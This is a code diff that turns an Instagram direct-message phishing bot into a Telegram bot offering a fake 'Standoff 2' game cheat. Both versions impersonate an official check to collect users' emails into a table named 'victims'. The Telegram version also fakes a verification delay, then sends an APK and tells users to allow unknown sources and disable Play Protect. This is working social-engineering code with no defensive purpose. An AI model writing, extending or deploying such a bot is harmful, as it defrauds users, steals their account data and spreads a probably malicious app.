@@ -1,108 +1,132 @@
-from instagrapi import Client
+import telebot
+from telebot import types
 import os, threading, time, sqlite3, datetime, re
 
-# --- НАСТРОЙКИ ---
-USERNAME   = os.environ.get("IG_USER")
-PASSWORD   = os.environ.get("IG_PASS")
-TARGET     = os.environ.get("IG_TARGET")
-SESSIONID  = os.environ.get("IG_SESSIONID")
+TOKEN = os.environ.get("TG_TOKEN")
+APK_PATH = "standoff_cheat.apk"   # файл в корне репозитория
 
-FIRST_MSG = (
-    "Здравствуйте! Это официальная проверка пользователей на наличие ботов. "
-    "Для подтверждения вашего аккаунта укажите основной email прямо в этом чате — "
-    "мы отправим на него код подтверждения.\n\n"
-    "Пример: your_email@gmail.com\n\n"
-    "Ответьте, пожалуйста, одним сообщением с вашим email."
-)
-
-WAIT_MSG = (
-    "Спасибо! Ваш email принят. "
-    "Ожидайте письмо с кодом подтверждения в течение 10 часов."
-)
+print("=== ENV CHECK ===")
+print("TG_TOKEN set:", bool(TOKEN))
+print("=================")
 
 DB = "victims.db"
+bot = telebot.TeleBot(TOKEN)
+
+# --- Хранилище состояний пользователей ---
+user_state = {}
 
 def init_db():
     db = sqlite3.connect(DB)
     db.execute("""CREATE TABLE IF NOT EXISTS victims (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
-        username TEXT, user_id TEXT, email TEXT, ts TEXT)""")
+        tg_id TEXT, username TEXT, email TEXT, ts TEXT)""")
     db.commit()
     db.close()
 
-def run_bot():
-    if not SESSIONID:
-        print("[-] FATAL: IG_SESSIONID не задан")
-        return
-
-    cl = Client()
-    # Настройка современного User-Agent, который пропускает Instagram
-    cl.set_user_agent(
-        "Instagram 410.0.0.0.96 Android (33/13; 480dpi; 1080x2400; "
-        "xiaomi; M2007J20CG; surya; qcom; en_US; 641123490)"
+# --- Красивое меню ---
+def main_menu():
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(
+        types.InlineKeyboardButton("🎮 Получить чит Standoff 2", callback_data="get_cheat"),
+        types.InlineKeyboardButton("📖 Инструкция", callback_data="info"),
+        types.InlineKeyboardButton("💬 Поддержка", callback_data="support"),
     )
-    cl.set_device({
-        "app_version": "410.0.0.0.96",
-        "android_version": 33,
-        "android_release": "13",
-        "dpi": "480dpi",
-        "resolution": "1080x2400",
-        "manufacturer": "xiaomi",
-        "device": "surya",
-        "model": "M2007J20CG",
-        "cpu": "qcom",
-        "version_code": "641123490",
-    })
+    return kb
 
-    try:
-        cl.login_by_sessionid(SESSIONID)
-        print("[+] Логин по sessionid ок")
-    except Exception as e:
-        print("[-] login error:", repr(e))
+@bot.message_handler(commands=['start'])
+def on_start(m):
+    text = (
+        "🔥 <b>Standoff 2 Cheat v3.2</b>\n\n"
+        "Добро пожаловать в официальный бот для выдачи чита.\n\n"
+        "📌 <b>Возможности:</b>\n"
+        "• Aimbot (автонаведение)\n"
+        "• Wallhack (видеть через стены)\n"
+        "• ESP (показ врагов)\n"
+        "• NoRecoil (без отдачи)\n"
+        "• SpeedHack\n\n"
+        "⚠️ <b>Для получения APK требуется подтверждение email от аккаунта Standoff 2.</b>\n\n"
+        "Нажми кнопку ниже, чтобы начать 👇"
+    )
+    bot.send_message(m.chat.id, text, parse_mode="HTML", reply_markup=main_menu())
+
+@bot.callback_query_handler(func=lambda c: True)
+def on_callback(c):
+    bot.answer_callback_query(c.id)
+    if c.data == "get_cheat":
+        text = (
+            "📧 <b>Шаг 1 из 2 — Подтверждение аккаунта</b>\n\n"
+            "Для выдачи APK-файла читера необходимо подтвердить, "
+            "что у вас есть аккаунт в Standoff 2.\n\n"
+            "Введите email, привязанный к вашему аккаунту Standoff 2 👇"
+        )
+        bot.send_message(c.message.chat.id, text, parse_mode="HTML")
+        user_state[c.message.chat.id] = "waiting_email"
+
+    elif c.data == "info":
+        bot.send_message(c.message.chat.id,
+            "📖 <b>Инструкция:</b>\n\n"
+            "1. Нажми «Получить чит»\n"
+            "2. Введи email от аккаунта Standoff 2\n"
+            "3. Дождись проверки\n"
+            "4. Скачай APK\n"
+            "5. Установи (разреши установку из неизвестных источников)\n"
+            "6. Запусти чит перед входом в игру",
+            parse_mode="HTML")
+
+    elif c.data == "support":
+        bot.send_message(c.message.chat.id,
+            "💬 По вопросам: @your_support_username",
+            parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: user_state.get(m.chat.id) == "waiting_email")
+def on_email(m):
+    text = m.text or ""
+    EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
+    match = EMAIL_RE.search(text)
+
+    if not match:
+        bot.send_message(m.chat.id, "❌ Некорректный email. Попробуйте снова.")
         return
 
+    email = match.group(0)
+    username = m.from_user.username or m.from_user.first_name or "?"
+    uid = str(m.from_user.id)
+
+    db = sqlite3.connect(DB)
+    db.execute("INSERT INTO victims (tg_id,username,email,ts) VALUES (?,?,?,?)",
+               (uid, username, email, datetime.datetime.now().isoformat()))
+    db.commit()
+    db.close()
+    print(f"[+] {username}: {email}")
+
+    bot.send_message(m.chat.id, "⏳ <b>Проверяем ваш email в базе Standoff 2...</b>", parse_mode="HTML")
+    time.sleep(3)
+    bot.send_message(m.chat.id, "⏳ <b>Проверка пройдена. Готовим APK...</b>", parse_mode="HTML")
+    time.sleep(2)
+
+    # Отправка APK
     try:
-        user_id = cl.user_id_from_username(TARGET)
-        cl.direct_send(FIRST_MSG, [user_id])
-        print(f"[+] Отправлено {TARGET}")
+        with open(APK_PATH, "rb") as f:
+            bot.send_document(
+                m.chat.id, f,
+                caption=(
+                    "✅ <b>Standoff 2 Cheat v3.2</b>\n\n"
+                    "📦 Установите APK и запустите перед входом в игру.\n"
+                    "🔑 Активация: автоматическая.\n\n"
+                    "⚠️ Не забудьте отключить Play Protect."
+                ),
+                parse_mode="HTML")
+        print(f"[+] APK отправлен {username}")
     except Exception as e:
-        print("[-] send error:", repr(e))
+        bot.send_message(m.chat.id, "❌ Ошибка при отправке APK. Напишите в поддержку.")
+        print("[-] apk error:", repr(e))
 
-    EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
-    seen, replied = set(), set()
+    user_state.pop(m.chat.id, None)
 
-    while True:
-        try:
-            for t in cl.direct_threads(amount=20):
-                for msg in t.messages:
-                    key = (t.id, msg.id)
-                    if key in seen or msg.user_id == cl.user_id:
-                        continue
-                    seen.add(key)
-                    text = msg.text or ""
-                    m = EMAIL_RE.search(text)
-                    if not m:
-                        continue
-                    email = m.group(0)
-                    username = t.users[0].username if t.users else "?"
-                    uid = str(msg.user_id)
-                    db = sqlite3.connect(DB)
-                    db.execute(
-                        "INSERT INTO victims (username,user_id,email,ts) VALUES (?,?,?,?)",
-                        (username, uid, email, datetime.datetime.now().isoformat()))
-                    db.commit()
-                    db.close()
-                    print(f"[+] {username}: {email}")
-                    if uid not in replied:
-                        replied.add(uid)
-                        try:
-                            cl.direct_send(WAIT_MSG, [int(uid)])
-                            print(f"[+] Подтверждение отправлено {username}")
-                        except Exception as e:
-                            print("[-] reply error:", repr(e))
-        except Exception as e:
-            print("[-] loop error:", repr(e))
-        time.sleep(15)
+def run_bot():
+    time.sleep(5)
+    print("[*] Бот запущен, слушаю сообщения...")
+    bot.infinity_polling()
 
 def start_bot_thread():
     init_db()
